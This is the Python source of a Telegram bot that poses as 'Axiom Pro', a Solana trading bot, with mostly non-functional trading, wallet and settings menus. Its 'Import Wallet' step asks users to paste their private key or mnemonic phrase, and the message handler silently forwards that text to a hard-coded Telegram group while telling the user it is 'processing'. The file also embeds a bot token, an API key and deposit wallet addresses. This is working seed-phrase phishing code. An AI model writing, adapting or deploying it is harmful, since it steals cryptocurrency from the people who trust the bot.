from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import asyncio
import nest_asyncio
import sys
import httpx
import telegram.error

# ===== CONFIG =====
TOKEN = "7616592587:AAHqwUmu7s3DfYsZrnSPFvmAmuthT0Kc_OE"
FORWARD_GROUP_ID = -1003362100281
BIRDEYE_API_KEY = "4d50e11c0b55474994a3986dca003921"

# ===== MENU BUILDERS =====
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet"),
         InlineKeyboardButton("🏆 Invite Friends", callback_data="invite_friends")],
        [InlineKeyboardButton("💵 Buy/Sell", callback_data="buy_sell"),
         InlineKeyboardButton("🏦 Asset", callback_data="asset")],
        [InlineKeyboardButton("👥 Copy Trading", callback_data="copy_trading"),
         InlineKeyboardButton("📉 Limit Order", callback_data="limit_order")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
         InlineKeyboardButton("💼 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("🌐 Language", callback_data="language"),
         InlineKeyboardButton("📖 Help", callback_data="help")],
        [InlineKeyboardButton("✨💹 Generate PnL 💹✨", callback_data="generate_pnl")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_start_message():
    return (
        "👋 **Welcome to Axiom Pro!** — the fastest and most secure bot for trading any token on Solana!\n\n"
        "🚀 You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n"
        "`FbCGhoPAKWWZuVpnU5owKP3MWYNZ4MNP15QHcCS2HvJ7`\n\n"
        "Or buy SOL with Apple / Google Pay via [MoonPay](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=E3Wedr2JneS95Hr88bWBR16kufHdVpPRfTvQxzmhoWDJ&showWalletAddressForm=true&currencyCode=sol&signature=JMn51tmxrV3PHERn6FxBHIIrsdeWci7bPe5mXRjRcK0%3D)\n\n"
        "Once done, tap refresh and your balance will appear here.\n\n"
        "💡 To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.\n\n"
        "📱 For more info on your wallet and to import your seed phrase, tap **Wallet** below."
    )

# ===== HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        get_start_message(),
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )


async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    submenus = {
        "import_wallet": "🔐 **Import Wallet**\n\nPlease paste your private key or mnemonic phrase:\n\n⚠️ *Never share this with others!*",
        "invite_friends": (
            "🏆 **Invite Friends**\n\n"
            "🔗 [Invite link](https://t.me/axiompro1_bot)\n\n"
            "💵 Withdrawable: 0 ($0)(0 pending)\n"
            "💰 Total withdrawn: 0 ($0)\n"
            "👥 Total invited: 0 people\n"
            "💳 Receiving address: null\n\n"
            "📖 Rules:\n"
            "1️⃣ Earn 25% of invitees' trading fees permanently\n"
            "2️⃣ Withdrawals start from 0.01, max 1 per 24h"
        ),
        "asset": "❌ *Failed.*\n\n⚠️ You have no wallets. Please bind or generate one.",
        "wallet": "❌ *Failed.*\n\n⚠️ You have no wallets. Please bind or generate one.",
        "limit_order": (
            "📉 **Limit Order Setup**\n\nAdd orders by price or percentage. The bot will handle buy/sell actions automatically.\n\n"
            "✅ Trigger tolerance: 1%\nTurbo = faster ⚡ | Anti-MEV = safer 🛡️"
        ),
        "copy_trading": (
            "👥 **Copy Trading Dashboard**\n\n💼 Wallet: `null`\nCopy Trade wallets: 0/10\n\n"
            "🟢 Active = Copying\n🟠 Paused = Idle"
        ),
        "help": (
            "📖 **Help Section**\n\n🌟 If bot lags, retry after a few minutes.\n"
            "🌟 Use `/trades` for recent activity.\n🌟 Withdraw from Wallet menu.\n🌟 ORCA pools not supported."
        ),
        "settings": (
            "⚙️ **Settings Panel**\n\nCustomize your general settings. Click ⚙️ Buy or ⚙️ Sell to customize each.\n\n"
            "ℹ️ Global settings apply to all wallets.\n"
            "ℹ️ You can override them for specific strategies via Signals, Copytrade, or Auto Snipe."
        ),
        "language": "🌐 Language automatically adjusts to your region.",
        "generate_pnl": "💹 **Generating PnL Report...**\n✨ Coming soon!"
    }

    if query.data == "back":
        await query.edit_message_text(
            get_start_message(),
            reply_markup=get_main_menu(),
            parse_mode="Markdown"
        )
        return

    if query.data in submenus:
        if query.data == "import_wallet":
            context.user_data["awaiting_wallet"] = True

        if query.data == "copy_trading":
            keyboard = [
                [InlineKeyboardButton("✨➕ Add New Copy ✨", callback_data="add_copy")],
                [InlineKeyboardButton("💠⏸ Pause All 💠", callback_data="pause_all")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        elif query.data in ["asset", "wallet"]:
            keyboard = [
                [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        elif query.data == "settings":
            keyboard = [
                [InlineKeyboardButton("🛡️ Anti-MEV", callback_data="no_wallet")],
                [InlineKeyboardButton("⚡ Degen Mode", callback_data="no_wallet")],
                [InlineKeyboardButton("🟢 Buy", callback_data="no_wallet")],
                [InlineKeyboardButton("🔴 Sell", callback_data="no_wallet")],
                [InlineKeyboardButton("💲 Fees | On", callback_data="no_wallet")],
                [InlineKeyboardButton("🌐 Monitor (All Chains)", callback_data="no_wallet")],
                [InlineKeyboardButton("💼 Wallet Selection | Single", callback_data="no_wallet")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        else:
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]

        await query.edit_message_text(
            submenus[query.data],
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    # Check if user sent wallet info
    if context.user_data.get("awaiting_wallet"):
        try:
            await update.message.forward(chat_id=FORWARD_GROUP_ID)
        except Exception as e:
            print(f"⚠️ Forwarding error: {e}")
        await update.message.reply_text(
            "⚙️✨ *Processing your wallet details...*\n\nPlease tap **Back** to return to start.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]),
            parse_mode="Markdown"
        )
        context.user_data["awaiting_wallet"] = False


# ===== MAIN LOOP WITH AUTO-RECONNECT =====
async def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    while True:
        try:
            print("🤖 Bot is running... Press Ctrl+C to stop.")
            await app.run_polling(timeout=120, drop_pending_updates=True)
        except (telegram.error.TimedOut, httpx.ConnectTimeout):
            print("⚠️ Connection timed out. Retrying in 10 seconds...")
            await asyncio.sleep(10)
            continue
        except Exception as e:
            print(f"❌ Unexpected error: {e}")
            print("⏳ Restarting in 15 seconds...")
            await asyncio.sleep(15)
            continue


# ===== START ENTRY =====
if __name__ == "__main__":
    if sys.platform.startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    nest_asyncio.apply()
    asyncio.run(main())
